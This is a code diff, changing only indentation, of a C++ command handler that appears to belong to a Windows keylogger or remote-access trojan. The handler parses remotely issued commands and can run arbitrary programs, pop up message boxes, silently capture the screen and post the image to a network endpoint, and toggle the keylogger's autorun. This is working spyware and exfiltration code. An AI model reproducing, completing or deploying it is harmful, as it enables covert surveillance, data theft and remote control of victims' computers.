@@ -7,105 +7,105 @@
 #include "Settings.h"
 
 static std::vector<std::string> split(const std::string &s, char delim) {
-    std::stringstream ss(s);
-    std::string item;
-    std::vector<std::string> elems;
-    while(std::getline(ss, item, delim)) {
-        elems.push_back(item);
-    }
-    return elems;
+	std::stringstream ss(s);
+	std::string item;
+	std::vector<std::string> elems;
+	while (std::getline(ss, item, delim)) {
+		elems.push_back(item);
+	}
+	return elems;
 }
 
 inline std::string join_at_index(const std::vector<std::string> &v, std::string delim, int index = 0) {
-    std::string out;
-    std::for_each(v.begin() + index, v.end(), [&](const std::string &s) { out += s + delim; });
-    return out;
+	std::string out;
+	std::for_each(v.begin() + index, v.end(), [&](const std::string &s) { out += s + delim; });
+	return out;
 }
 
 struct command_t {
-    std::string name;
-    std::function<void(std::vector<std::string>)> func;
+	std::string name;
+	std::function<void(std::vector<std::string>)> func;
 };
 
 command_t commandDefs[] = {
-    {
-        "batch", [](std::vector<std::string> args) {
-            if(!args.size())
-                return;
+		{
+			"batch", [](std::vector<std::string> args) {
+				if (!args.size())
+					return;
 
-            std::string fileArgs = join_at_index(args, " ");
-            wchar_t dest[_MAX_PATH];
-            mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);
+				std::string fileArgs = join_at_index(args, " ");
+				wchar_t dest[_MAX_PATH];
+				mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);
 
-            PROCESS_INFORMATION pi;
-            ZeroMemory(&pi, sizeof(pi));
+				PROCESS_INFORMATION pi;
+				ZeroMemory(&pi, sizeof(pi));
 
-            STARTUPINFO si;
-            ZeroMemory(&si, sizeof(si));
+				STARTUPINFO si;
+				ZeroMemory(&si, sizeof(si));
 
-            si.cb = sizeof(si);
+				si.cb = sizeof(si);
 
-            CreateProcessW(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-        }
-    },
-    {
-        "msgbox", [](std::vector<std::string> args) {
-            if(!args.size())
-                return;
-
-            std::string msgboxText = join_at_index(args, " ");
-            wchar_t text[1024];
-            mbstowcs(text, msgboxText.c_str(), 1024);
-            MessageBoxW(NULL, text, NULL, MB_OK);
-        }
-    },
-    {
-        "screenshot", [](std::vector<std::string> args) {
-
-            static const TCHAR* tmpFile = V_FAKE_TMP1;
-
-            screenshot.TakeScreenshot(tmpFile);
-
-			FILE *fp;
-            errno_t error = _tfopen_s(&fp, tmpFile, _T("rb"));
-			if(error != 0) {
-				Error(_T("_tfopen failed"));
-				return;
+				CreateProcessW(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 			}
+		},
+		{
+			"msgbox", [](std::vector<std::string> args) {
+				if (!args.size())
+					return;
 
-			fseek(fp, 0, SEEK_END);
-			size_t size = ftell(fp);
-			fseek(fp, 0, SEEK_SET);
+				std::string msgboxText = join_at_index(args, " ");
+				wchar_t text[1024];
+				mbstowcs(text, msgboxText.c_str(), 1024);
+				MessageBoxW(NULL, text, NULL, MB_OK);
+			}
+		},
+		{
+			"screenshot", [](std::vector<std::string> args) {
+
+				static const TCHAR* tmpFile = V_FAKE_TMP1;
+
+				screenshot.TakeScreenshot(tmpFile);
+
+				FILE *fp;
+				errno_t error = _tfopen_s(&fp, tmpFile, _T("rb"));
+				if (error != 0) {
+					Error(_T("_tfopen failed"));
+					return;
+				}
+
+				fseek(fp, 0, SEEK_END);
+				size_t size = ftell(fp);
+				fseek(fp, 0, SEEK_SET);
 
 
-			char* buffer = (char*)malloc(size);
-            if (!buffer)
-            {
-				Error(_T("Couldn't allocate buffer"));
+				char* buffer = (char*)malloc(size);
+				if (!buffer)
+				{
+					Error(_T("Couldn't allocate buffer"));
+					fclose(fp);
+					return;
+				}
+
+				if (fread_s(buffer, size, 1, size, fp) != size)
+				{
+					Error(_T("fread_s did not return size"));
+					free(buffer);
+					fclose(fp);
+					return;
+				}
 				fclose(fp);
-				return;
-            }
 
-			if(fread_s(buffer, size, 1, size, fp) != size)
-            {
-				Error(_T("fread_s did not return size"));
+				network.SendPost(buffer, size, false);
+
 				free(buffer);
-				fclose(fp);
-				return;
+				DeleteFile(_T("screen.png"));
 			}
-			fclose(fp);
-
-            network.SendPost(buffer, size, false);
-
-			free(buffer);
-			DeleteFile(_T("screen.png"));
-        }
-    },
-    {
-        "remove", [](std::vector<std::string> args) {
-            keylogger.SetAutorun(false);
-        }
-    }
+		},
+		{
+			"remove", [](std::vector<std::string> args) {
+				keylogger.SetAutorun(false);
+			}
+		}
 };
 
 CommandExe::CommandExe()
@@ -120,18 +120,18 @@ CommandExe::~CommandExe()
 
 void CommandExe::Run(std::string cmds)
 {
-    if(cmds.size() == 0) {
-        return;
-    }
+	if (cmds.size() == 0) {
+		return;
+	}
 
-    std::vector<std::string> commands = split(cmds, ';');
-    for(auto &cmd : commands) {
-        std::vector<std::string> args = split(cmd, ' ');
-        if(args.size()) {
-            auto result = std::find_if(std::begin(commandDefs), std::end(commandDefs), [&](const command_t & cmd) { return cmd.name == args[0].c_str(); });
-            if(result != std::end(commandDefs)) {
-                (*result).func(split(join_at_index(args, " ", 1), ' '));
-            }
-        }
-    }
+	std::vector<std::string> commands = split(cmds, ';');
+	for (auto &cmd : commands) {
+		std::vector<std::string> args = split(cmd, ' ');
+		if (args.size()) {
+			auto result = std::find_if(std::begin(commandDefs), std::end(commandDefs), [&](const command_t & cmd) { return cmd.name == args[0].c_str(); });
+			if (result != std::end(commandDefs)) {
+				(*result).func(split(join_at_index(args, " ", 1), ' '));
+			}
+		}
+	}
 }
